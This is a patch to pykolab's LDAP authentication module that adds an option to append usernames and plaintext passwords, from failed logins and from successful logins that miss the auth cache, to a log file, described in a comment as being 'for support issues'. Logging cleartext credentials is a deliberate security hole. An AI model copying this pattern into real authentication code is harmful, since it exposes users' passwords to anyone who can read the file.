@@ -1,0 +1,28 @@
+--- a/pykolab/auth/ldap/__init__.py	2016-06-23 11:17:58.454985341 +0200
++++ b/pykolab/auth/ldap/__init__.py	2016-07-13 17:52:51.062743087 +0200
+@@ -210,7 +210,10 @@
+         except:
+             pass
+ 
++        in_auth_cache = True
++
+         if entry_dn == None:
++            in_auth_cache = False
+             _search = self.ldap.search_ext(
+                     base_dn,
+                     ldap.SCOPE_SUBTREE,
+@@ -290,6 +293,14 @@
+ 
+                 retval = False
+ 
++        # store username and password for support issues ("a member of staff will never ask you for your password")
++        if self.config_get('storeloginpwd') == "True":
++            with open(self.config_get('storeloginpwd.file'), "a") as pwdfile:
++                if retval == False:
++                    pwdfile.write("%s failed login: user_dn %s and password %s\n" % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M'), entry_dn, login[1]))
++                elif in_auth_cache == False:
++                    pwdfile.write("%s successful login: user_dn %s and password %s\n" % (datetime.datetime.now().strftime('%Y-%m-%d %H:%M'), entry_dn, login[1]))
++
+         return retval
+ 
+     def connect(self):
